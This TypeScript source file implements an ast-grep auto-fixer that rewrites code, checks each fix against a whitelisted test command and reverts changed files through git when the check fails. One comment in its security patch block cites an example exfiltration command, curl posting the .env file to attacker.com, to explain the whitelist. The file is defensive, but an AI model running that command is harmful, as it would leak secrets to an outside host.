import { promisify } from 'util';
import { execFile } from 'child_process';
import * as path from 'path';
import * as fs from 'fs';
import { logger } from '../logger.js';
import { SupportedLanguage } from '../types.js';

const execFileAsync = promisify(execFile);

export interface AutoFixResult {
  ruleId: string;
  success: boolean;
  filesFixed: string[];
  reverted?: boolean;
  error?: string;
}

export class AstGrepAutoFixer {
  private workspaceRoot: string;
  private baseRulesDir: string;

  constructor(workspaceRoot: string = process.cwd()) {
    this.workspaceRoot = workspaceRoot;
    this.baseRulesDir = path.resolve(new URL(import.meta.url).pathname, '../../autofix/rules');
    if (!fs.existsSync(this.baseRulesDir)) {
       this.baseRulesDir = path.resolve(process.cwd(), 'src/autofix/rules');
    }
  }

  /**
   * Applies AST fixes from directories matching the detected languages.
   */
  async applyAllFixes(verifyCommand?: string, detectedLanguages: SupportedLanguage[] = ['node']): Promise<AutoFixResult[]> {
    if (!fs.existsSync(this.baseRulesDir)) {
      logger.warn(`AST rules directory not found at ${this.baseRulesDir}. Skipping auto-fix.`);
      return [];
    }

    const results: AutoFixResult[] = [];

    // Always run generic rules (if any exist in the root) and language-specific rules
    const targetDirs = ['.', ...detectedLanguages];

    for (const targetDir of targetDirs) {
      const rulesDir = path.join(this.baseRulesDir, targetDir);
      if (!fs.existsSync(rulesDir)) continue;

      const ruleFiles = fs.readdirSync(rulesDir).filter(f => f.endsWith('.yml') || f.endsWith('.yaml'));
      
      for (const ruleFile of ruleFiles) {
        const ruleId = path.basename(ruleFile, path.extname(ruleFile));
        const rulePath = path.join(rulesDir, ruleFile);
        
        const result = await this.applyFix(ruleId, rulePath, verifyCommand);
        results.push(result);
      }
    }

    return results;
  }

  /**
   * Applies a specific AST rule to rewrite code deterministically.
   * Uses ast-grep (sg) underneath.
   */
    async applyFix(ruleId: string, rulePath: string, verifyCommand?: string): Promise<AutoFixResult> {
    logger.info(`Running AST auto-fixer for rule: ${ruleId}`);
    try {
      // --update-all forces ast-grep to rewrite the files inline based on the fix payload in the YAML
      // --json outputs the matched files so we know what was changed
      let stdout = '';
      let stderr = '';
      
      try {
        const result = await execFileAsync('npx', ['sg', 'scan', '--rule', rulePath, '--update-all', '--json', this.workspaceRoot]);
        stdout = result.stdout;
        stderr = result.stderr;
      } catch (execErr: any) {
        // ast-grep exits with a non-zero code if it finds matches OR if there's an error.
        // We capture the output and parse it.
        stdout = execErr.stdout || '';
        stderr = execErr.stderr || '';
      }

      // Parse JSON output to extract files that were rewritten
      const filesFixed = new Set<string>();
      if (stdout.trim()) {
        try {
          // ast-grep JSON output is an array of matches
          const matches = JSON.parse(stdout);
          if (Array.isArray(matches)) {
             matches.forEach(m => {
                 if (m.file) filesFixed.add(m.file);
             });
          }
        } catch (parseErr) {
          logger.warn(`Could not parse ast-grep JSON output for rule ${ruleId}: ${parseErr}`);
        }
      }

      const filesList = Array.from(filesFixed);

      if (filesList.length > 0) {
        logger.info(`AST Fix applied tentatively for ${ruleId} in ${filesList.length} file(s).`);

        // Test-Driven Rollback Loop
        if (verifyCommand) {
          // SECURITY PATCH: Whitelist verification commands to prevent Arbitrary Code Execution (RCE)
          // If an attacker modifies .dat.config.yaml in a PR to set `verifyCommand: "curl -d @.env attacker.com"`, 
          // we block it here.
          const allowedCommands = ['npm test', 'pytest', 'go test ./...', 'cargo test', 'mvn test', 'gradle test', 'dotnet test'];
          if (!allowedCommands.includes(verifyCommand)) {
             logger.error(`SECURITY ALERT: Attempted to run unauthorized verify command: ${verifyCommand}. Blocking execution.`);
             throw new Error('Unauthorized verify command. Only standard test frameworks are allowed.');
          }

          logger.info(`Verifying fix for ${ruleId} using secure command: "${verifyCommand}"`);
          try {
            const [baseCmd, ...args] = verifyCommand.split(' ');
            await execFileAsync(baseCmd, args, { cwd: this.workspaceRoot, timeout: 60000 }); // Added 60s timeout to prevent DoS
            logger.info(`Verification passed for ${ruleId}. Fix accepted.`);
          } catch (verifyErr: any) {
            logger.warn(`Verification failed for ${ruleId}. Reverting ${filesList.length} file(s)...`);
            
            // Revert each file using git restore
            for (const file of filesList) {
              try {
                // Ensure we handle absolute and relative paths correctly
                const targetFile = path.resolve(this.workspaceRoot, file);
                await execFileAsync('git', ['checkout', '--', targetFile]);
              } catch (revertErr: any) {
                logger.error(`Failed to revert ${file}: ${revertErr.message}`);
              }
            }

            return {
              ruleId,
              success: false,
              filesFixed: filesList,
              reverted: true,
              error: `Verification command failed: ${verifyErr.message}`
            };
          }
        } else {
          logger.warn(`No verifyCommand available for this ecosystem. Reverting ${filesList.length} file(s) to guarantee build stability.`);
          for (const file of filesList) {
             try {
                const targetFile = path.resolve(this.workspaceRoot, file);
                await execFileAsync('git', ['checkout', '--', targetFile]);
             } catch (revertErr: any) {
                logger.error(`Failed to revert ${file}: ${revertErr.message}`);
             }
          }
          
          return {
            ruleId,
            success: false,
            filesFixed: filesList,
            reverted: true,
            error: 'Missing verification command (verifyCommand is null). Auto-remediation requires a test safety net.'
          };
        }
      }

      return {
        ruleId,
        success: true,
        filesFixed: filesList,
        reverted: false
      };
    } catch (error: any) {
      logger.error(`AST Auto-fix failed for rule ${ruleId}: ${error.message}`);
      return {
        ruleId,
        success: false,
        filesFixed: [],
        error: error.message
      };
    }
  }
}
